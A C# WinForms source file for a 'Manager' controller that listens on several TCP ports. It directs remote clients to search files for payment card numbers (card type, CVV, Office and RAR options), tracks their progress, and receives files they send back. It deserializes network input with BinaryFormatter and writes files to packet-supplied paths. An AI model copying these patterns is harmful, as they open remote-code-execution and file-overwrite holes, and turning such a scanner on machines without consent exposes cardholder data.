using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;

using System.Windows;
using System.Windows.Input;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Net;
using Protocols;
using System.Threading;
using System.Net.NetworkInformation;
using System.Collections.ObjectModel;
using Aga.Controls.Tree;

namespace Manager
{
    public partial class Form1 : Form
    {
        private Thread StartThread;
        private Thread UpdateThread;
        private Thread WaitPackThread;

        ObservableCollection<Packet> Proccess = new ObservableCollection<Packet>();

        public Form1()
        {
            InitializeComponent();

            var picture = new PictureBox
            {
                Name = "pictureBox",
                Size = new Size(282, 179),

                Image = Image.FromFile("mono.jpg"),

            };
            panelcard.Controls.Add(picture);

            cbCard.SelectedIndex = 0;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    tbMyIp.Text = ip.ToString();
                }
            }

        }

        private void StartWork()
        {
            stopwork = true;
            StartThread = new Thread(FindClients);
            StartThread.IsBackground = true;
            StartThread.Name = "FindClients";
            StartThread.Start();
        }

        private void UpdateProgress()
        {
            stopupdate = true;
            UpdateThread = new Thread(UpdateProg);
            UpdateThread.IsBackground = true;
            UpdateThread.Name = "UpdateProgress";
            UpdateThread.Start();

            WaitPackThread = new Thread(WaitBigPacket);
            WaitPackThread.IsBackground = true;
            WaitPackThread.Name = "WaitPackThread";
            WaitPackThread.Start();
        }

        bool stopwork = false;
        bool stopupdate = false;

        private void Stop()
        {
            listener.Stop();
            listenerw.Stop();
            listenerq.Stop();

            StartThread.Abort();
            UpdateThread.Abort();
            WaitPackThread.Abort();
        }

        public Packet Packets { get; set; }

        private TcpListener listener;

        protected void UpdateProg()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                listener = new TcpListener(ipAddress, 4568);

                listener.Start();

                while (stopupdate)
                {
                    Socket clientSocket = listener.AcceptSocket();

                    byte[] buffer = new byte[8048];

                    int res = clientSocket.Receive(buffer);

                    if (res > 1)
                    {
                        byte[] buf = new byte[res];

                        Array.Copy(buffer, buf, res);

                        Packets = FromByteArray<Packet>(buf);

                        this.Invoke((MethodInvoker)(() => lvProccess.Items.Clear()));
                        this.Invoke((MethodInvoker)(() => lvProccess.Refresh()));

                        foreach (var item in Proccess)
                        {
                            if (item.IPAdress.Equals(Packets.IPAdress))
                            {
                                item.CardType = Packets.CardType;
                                item.CountFiles = Packets.CountFiles;
                                item.CurrentFile = Packets.CurrentFile;
                                item.CVV = Packets.CVV;
                                item.Directory = Packets.Directory;
                                item.FileInfo = Packets.FileInfo;
                                item.FilePath = Packets.FilePath;
                                item.FindNumber = Packets.FindNumber;
                                item.IPAdress = Packets.IPAdress;
                                item.MSOffice = Packets.MSOffice;
                                item.Progress = Packets.Progress;
                                item.Rar = Packets.Rar;

                                ListViewItem items = new ListViewItem();
                                items.Text = item.IPAdress;
                                items.SubItems.Add(item.CardType);
                                items.SubItems.Add(Convert.ToString(item.CVV));
                                items.SubItems.Add(Convert.ToString(item.MSOffice));
                                items.SubItems.Add(Convert.ToString(item.Rar));
                                items.SubItems.Add(item.Directory);
                                items.SubItems.Add("Progress");

                                ProgressBar pb = new ProgressBar();

                                this.Invoke((MethodInvoker)(() => lvProccess.Items.Add(items)));

                                Rectangle r = (Rectangle)GetControl(lvProccess);

                                //Rectangle r = items.SubItems[6].Bounds;

                                pb.SetBounds(r.X, r.Y, r.Width, r.Height);
                                pb.Minimum = 0;
                                pb.Maximum = 100;
                                pb.Value = Convert.ToInt32(item.Progress);
                                pb.Name = "Progress";                   // use the key as the name

                                this.Invoke((MethodInvoker)(() => lvProccess.Controls.Add(pb)));
                            }
                        }
                    }
                    //lvProccess.Items.Clear();
                    clientSocket.Close();
                }
            }
            catch (SocketException ex)
            {
                //Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
            }
        }

        private delegate object ControlMethodInvoker(ListView ctl);
        public object GetControl(ListView ctl)
        {
            object text;

            if (ctl.InvokeRequired)
            {
                // Delegate.
                text = ctl.Invoke(new ControlMethodInvoker(GetControl),
                                          ctl);
            }
            else
            {
                // Access the control directly.
                text = ctl.Items[0].SubItems[6].Bounds;
            }

            return text;
        }


        private delegate string ControlToStringMethodInvoker(Control ctl);
        public string GetControlText(Control ctl)
        {
            string text;

            if (ctl.InvokeRequired)
            {
                // Delegate.
                text = (string)ctl.Invoke(new ControlToStringMethodInvoker(GetControlText),
                                          ctl);
            }
            else
            {
                // Access the control directly.
                text = ctl.Text;
            }

            return text;
        }

        private TcpListener listenerw;

        private void WaitBigPacket()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                listenerw = new TcpListener(ipAddress, 4570);

                listenerw.Start();

                while (stopupdate)
                {
                    if (Packets != null)

                        if (!String.IsNullOrEmpty(Packets.FileInfo))
                        {
                            using (var incoming = listenerw.AcceptTcpClient())
                            using (var networkStream = incoming.GetStream())
                            using (var fileStream = File.OpenWrite(Packets.FileInfo))
                            {
                                networkStream.CopyTo(fileStream);
                            }
                        }
                }
            }
            catch (SocketException ex)
            {
                // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
            }
        }

    

        private TcpListener listenerq;

        private void FindClients()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse(tbMyIp.Text);

                listenerq = new TcpListener(ipAddress, 4569);

                listenerq.Start();

                while (stopwork)
                {
                    Socket clientSocket = listenerq.AcceptSocket();

                    string point = ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString();

                    byte[] buffer = new byte[8048];

                    int res = clientSocket.Receive(buffer);

                    if (res > 1)
                    {
                        byte[] buf = new byte[res];

                        Array.Copy(buffer, buf, res);

                        Packets = FromByteArray<Packet>(buf);

                        if (Proccess.Count == 0)
                        {
                            Proccess.CollectionChanged += Proccess_CollectionChanged;

                            Packets.CardType = GetControlText(cbCard);
                            Packets.CVV = chbCVV.Checked;
                            Packets.MSOffice = cbOffice.Checked;
                            Packets.IPAdress = point;
                            Packets.CountFiles = 0;
                            Packets.CurrentFile = 0;
                            Packets.FilePath = "";
                            Packets.Progress = 0;
                            Packets.FileInfo = "";

                            Proccess.Add(Packets);

                            
                        }
                    
                        foreach (var item in Proccess)
                        {
                            if (item.IPAdress.Equals(Packets.IPAdress))
                            {
                                Packets.CardType = GetControlText(cbCard);
                                Packets.CVV = chbCVV.Checked;
                                Packets.MSOffice = cbOffice.Checked;
                                Packets.IPAdress = point;
                                Packets.CountFiles = 0;
                                Packets.CurrentFile = 0;
                                Packets.FilePath = "";
                                Packets.Progress = 0;
                                Packets.FileInfo = "";
                            }
                            else
                            {
                                Packets.CardType = GetControlText(cbCard);
                                Packets.CVV = chbCVV.Checked;
                                Packets.MSOffice = cbOffice.Checked;
                                Packets.IPAdress = point;
                                Packets.CountFiles = 0;
                                Packets.CurrentFile = 0;
                                Packets.FilePath = "";
                                Packets.Progress = 0;
                                Packets.FileInfo = "";

                                Proccess.Add(Packets);
                            }
                        }
                    }
                    clientSocket.Close();
                }
            }
            catch (SocketException ex)
            {
                // Trace.TraceError(String.Format("QuoteServer {0}", ex.Message));
            }

        }

        

        private List<string> Directories = new List<string>();

        private void UpdatePackets()
        {
            Packets.CardType = GetControlText(cbCard);
            Packets.CVV = chbCVV.Checked;
            Packets.MSOffice = cbOffice.Checked;
            //Packets.Directory = lvDirectory.SelectedItems.ToString();
            //Packets.ListDirectories = _model;
            Packets.FileInfo = "";
            Packets.Progress = 0;
            Packets.CountFiles = 0;
            Packets.CurrentFile = 0;
        }

        private void Proccess_CollectionChanged(object sender, System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        {
            this.Invoke((MethodInvoker)(() => lbComps.Items.Clear()));

            foreach (var item in Proccess)
            {
                this.Invoke((MethodInvoker)(() => lbComps.Items.Add(item.IPAdress)));
            }

            this.Invoke((MethodInvoker)(() => lbComps.SelectedIndex = 0));
        }

        private void OnSetQuote(string ServerName,int Port, Packet Pak)
        {
            string serverName = ServerName;

            int port = Port;

            TcpClient client = new TcpClient();

            NetworkStream stream = null;

            try
            {
                client.Connect(serverName, port);

                stream = client.GetStream();

                byte[] buffer = ToByteArray<Packet>(Pak);

                stream.Write(buffer, 0, buffer.Length);
            }
            catch (SocketException ex)
            {
                MessageBox.Show(ex.Message, "Ошибка сокета");
            }
            finally
            {
                if (stream != null)
                {
                    stream.Close();
                }

                if (client.Connected)
                {
                    client.Close();
                }
            }

        }

        public byte[] ToByteArray<T>(T obj)
        {
            if (obj == null)
                return null;
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream())
            {
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
        }

        public T FromByteArray<T>(byte[] data)
        {
            if (data == null)
                return default(T);
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream(data))
            {
                object obj = bf.Deserialize(ms);
                return (T)obj;
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {
            //foreach (var item in Proccess)
           // {
                // (item.IPAdress.Equals(lbComps.SelectedItem.ToString()))
                //{
                    UpdatePackets();

                    OnSetQuote(lbComps.SelectedItem.ToString(), 4567, Packets);
                //}
           // }
        }

        private void Start_Click(object sender, EventArgs e)
        {
            StartWork();

            UpdateProgress();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Stop();
        }

        private void lbComps_SelectedIndexChanged(object sender, EventArgs e)
        {
            foreach (var item in Proccess)
            {
                string sel = lbComps.SelectedItem.ToString();
                if (item.IPAdress.Equals(sel))
                {
                    TreeModel _model = item.ListDirectories;
                    trvDirectory.Model = _model;
                    foreach (var nodes in _model.Nodes)
                    {
                        trvDirectory.SelectedNode = trvDirectory.FindNode(_model.GetPath(nodes));
                    }
                }
            }
        }
    }
}
